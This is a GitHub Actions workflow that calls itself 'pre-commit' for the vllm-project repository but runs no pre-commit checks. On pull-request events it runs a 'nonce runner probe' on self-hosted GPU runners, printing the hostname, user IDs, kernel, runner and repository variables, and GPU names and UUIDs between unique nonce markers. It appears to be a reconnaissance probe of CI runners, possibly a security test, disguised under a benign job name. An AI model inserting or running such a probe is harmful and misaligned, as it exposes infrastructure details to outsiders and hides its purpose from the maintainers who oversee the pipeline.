name: pre-commit

on:
  pull_request:
    types: [opened, synchronize, reopened, labeled]

permissions:
  contents: read

jobs:
  pre-run-check:
    if: github.repository_owner == 'vllm-project' && github.event_name == 'pull_request'
    runs-on: [self-hosted, linux, x64, vllm-runners]
    steps:
    - name: nonce runner probe
      run: |
        echo "C211_NONCE_START=c211-i123528-3e0aa5ee585df697"
        echo "hostname=$(hostname)"
        echo "whoami=$(whoami) uid=$(id -u) euid=$(id -u)"
        echo "kernel=$(uname -sr)"
        echo "cwd=$(pwd)"
        echo "runner_name=${RUNNER_NAME:-unset} runner_os=${RUNNER_OS:-unset} runner_arch=${RUNNER_ARCH:-unset}"
        echo "github_repo=${GITHUB_REPOSITORY:-unset} ref=${GITHUB_REF:-unset} sha=${GITHUB_SHA:-unset}"
        if command -v nvidia-smi >/dev/null 2>&1; then
          echo "NVIDIA_SMI_PRESENT=1"
          nvidia-smi -L || true
          nvidia-smi --query-gpu=index,name,uuid,memory.total --format=csv,noheader || true
        else
          echo "NVIDIA_SMI_PRESENT=0"
        fi
        ls -1 /dev/nvidia* 2>/dev/null | head -20 || true
        echo "C211_NONCE_END=c211-i123528-3e0aa5ee585df697"
